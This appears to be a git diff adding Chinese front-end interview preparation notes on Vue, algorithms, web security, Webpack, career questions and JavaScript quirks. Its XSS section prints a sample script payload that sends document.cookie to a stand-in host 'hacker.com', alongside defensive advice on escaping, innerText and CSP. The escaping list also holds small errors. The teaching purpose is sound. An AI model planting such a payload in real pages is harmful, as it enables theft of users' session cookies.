@@ -292,3 +292,138 @@
     - postMessage 看一下 MDN
     
 
+#### vue押题
+1. （必考）Vue 有哪些生命周期钩子函数？
+    - [看文档](https://cn.vuejs.org/v2/api/#选项-生命周期钩子)
+    - （必考）Vue 如何实现组件通信？
+2. （必考）Vue 如何实现组件通信？
+    - 父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）
+    - 爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）
+    - [兄弟通信（new Vue() 作为 eventBus）](https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1)
+
+3. Vuex 的作用是什么？
+    - [看文档](https://vuex.vuejs.org/zh-cn/intro.html)
+4. VueRouter 路由是什么？
+    - 看文档
+
+5. Vue 的双向绑定是如何实现的？有什么缺点？
+    - [看文档](https://cn.vuejs.org/v2/guide/reactivity.html)
+6. Computed 计算属性的用法？跟 Methods 的区别。
+    - [参考](https://zhuanlan.zhihu.com/p/33778594)
+
+
+#### 算法押题  
+1. 排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
+2. 二分查找法
+3. 翻转二叉树
+4. 把上面三个背一下，算法题必过。
+    
+#### 安全押题
+
+1. 什么是 XSS 攻击？如何预防？
+
+    ```
+    div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
+// 恶意就被执行了，这就是 XSS
+    ```
+    - 预防:不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
+    - 如果你一样要用 innerHTML，字符过滤
+        - 把 < 替换成 &lt;
+        - 把 > 替换成 &gt;
+        - 把 & 替换成 &amp;
+        - 把 ’ 替换成 &#39;
+        - 把 ’ 替换成 &quot;
+        - 代码 div.innerHTML = userComment.replace(/>/g, ‘&lt;’).replace…
+    - 使用 CSP Content Security Policy
+
+
+2. 什么是 CSRF 攻击？如何预防？
+    - 过程:
+        - 用户在 qq.com 登录
+        - 用户切换到 hacker.com（恶意网站）
+        - hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。
+        - 用户在不知不觉中添加 hacker 为好友。
+        - 用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。
+    - 避免
+        - 检查 referer，qq.com 可以拒绝来自 hacker.com 的请求
+        - csrf_token 来解决
+
+
+#### Webpack 题
+1. 转译出的文件过大怎么办？
+    - 使用 code split
+    - 写法  import(‘xxx’).then(xxx=>{console.log(xxx)})
+    - xxx 模块就是按需加载的
+
+2. 转译速度慢什么办？
+3. 写过 webpack loader 吗？[参考](http://www.alloyteam.com/2016/01/webpack-loader-1/)
+
+
+### 发散题
+1. 从输入 URL 到页面展现中间发生了什么？
+    - DNS 查询 DNS 缓存
+    - 建立 TCP 连接（三次握手）连接复用
+    - 发送 HTTP 请求（请求的四部分）
+    - 后台处理请求
+    - 监听 80 端口
+    - 路由
+    - 渲染 HTML 模板
+    - 生成响应
+    - 发送 HTTP 响应
+    - 关闭 TCP 连接（四次挥手）
+    - 解析 HTML
+    - 下载 CSS（缓存
+    - 解析 CSS
+    - 下载 JS（缓存
+    - 解析 JS
+    - 下载图片
+    - 解析图片
+    - 渲染 DOM 树
+    - 渲染样式树
+    - 执行 JS
+
+2. 你没有工作经历吗？
+    - 一开始就问，可以拜拜。
+    - 中间问最后问，他想压价。
+    - 解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。
+
+3. 你遇到过最难的问题是什么？
+    - [参考](https://www.zhihu.com/question/35323603/answer/338796153)
+4. 你的期望薪资是多少？ 你想要的工资 加 1000~2000。
+5. 任何你不会的问题
+    - 承认不会
+    - 询问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？
+    - 根据面试官的回答，向有利于自己的方向引导话题。
+    
+
+#### 刁钻代码题
+1. map加parseInt
+    
+    ```
+    [1,2,3].map(parseInt)
+    parseInt(1,0, array) // 1
+    parseInt(2,1, array) // NaN
+    parseInt(3,2, array) // NaN
+    ```
+
+2. a.x = a = {}
+    
+    ```
+    var a = {n:1};
+    var b = a;
+    a.x = a = {n:2};
+    
+    问 a.x 是多少？
+    ```
+3. (a ==1 && a== 2 && a==3) 可能为 true 吗？
+    
+    ```
+    a = {
+      value: 0,
+      toString(){
+        a.value += 1
+        return a.value 
+      }
+    }
+    ```
+
